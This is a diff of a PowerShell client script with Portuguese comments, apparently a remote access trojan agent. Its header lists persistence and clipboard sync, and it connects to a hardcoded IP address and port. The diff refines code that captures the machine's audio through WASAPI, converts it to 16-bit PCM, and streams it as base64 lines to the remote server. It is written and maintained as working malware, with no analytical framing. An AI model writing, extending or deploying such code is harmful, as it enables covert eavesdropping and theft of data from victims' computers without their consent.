@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent + Persistencia + Clipboard Sync + Novo Banner
+# Agent + Persistencia + Clipboard Sync + Áudio Extensible + Novo Banner
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -444,39 +444,56 @@ if (-not ("R9KAgent" -as [type])) {
                     IntPtr pFormat;
                     audioClient.GetMixFormat(out pFormat);
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
+                    
                     int hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
                     if (hr != 0) {
                         lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Initialize falhou hr=" + hr); }
                         isAudioRunning = false; return;
                     }
+                    
                     Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                     IAudioCaptureClient captureClient;
                     audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
+                    
                     audioClient.Start();
                     bool sentFmt = false;
+                    
                     while (isAudioRunning && globalWriter != null) {
-                        Thread.Sleep(50);
+                        Thread.Sleep(10);
                         uint packetSize;
                         captureClient.GetNextPacketSize(out packetSize);
                         while (packetSize > 0 && isAudioRunning) {
                             IntPtr pData; uint numFrames; uint flags; ulong pos, qpc;
                             captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
+                            
                             if (numFrames > 0) {
                                 int bytes = (int)(numFrames * wfx.nBlockAlign);
                                 byte[] buffer = new byte[bytes];
                                 Marshal.Copy(pData, buffer, 0, bytes);
-                                if (wfx.wFormatTag == 3) {
-                                    byte[] pcm16 = new byte[bytes / 2];
-                                    for (int i = 0; i < bytes / 4; i++) {
+                                
+                                bool isFloat = (wfx.wFormatTag == 3);
+                                if (wfx.wFormatTag == 0xFFFE && wfx.wBitsPerSample == 32) isFloat = true;
+
+                                if (isFloat) {
+                                    int samples = bytes / 4;
+                                    byte[] pcm16 = new byte[samples * 2];
+                                    for (int i = 0; i < samples; i++) {
                                         float f = BitConverter.ToSingle(buffer, i * 4);
+                                        if (f > 1.0f) f = 1.0f;
+                                        if (f < -1.0f) f = -1.0f;
                                         short s = (short)(f * 32767.0f);
-                                        pcm16[i * 2] = (byte)(s & 0xFF); pcm16[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
+                                        pcm16[i * 2] = (byte)(s & 0xFF);
+                                        pcm16[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
                                     }
                                     buffer = pcm16;
                                 }
+                                
                                 lock (writeLock) {
                                     if (globalWriter != null) {
-                                        if (!sentFmt) { globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); sentFmt = true; }
+                                        if (!sentFmt) { 
+                                            globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); 
+                                            sentFmt = true; 
+                                        }
                                         globalWriter.WriteLine("AUDIO:" + Convert.ToBase64String(buffer));
                                     }
                                 }
@@ -620,7 +637,6 @@ if (-not ("R9KAgent" -as [type])) {
                             try {
                                 using (var wc = new WebClient()) {
                                     wc.Headers.Add("User-Agent", "Mozilla/5.0");
-                                    // IMAGEM DO BANNER ATUALIZADA AQUI
                                     byte[] imgBytes = wc.DownloadData("https://i.imgur.com/7PjKabp.jpeg?v=1");
                                     using (MemoryStream ms = new MemoryStream(imgBytes)) { bgImg = Image.FromStream(ms); }
                                 }
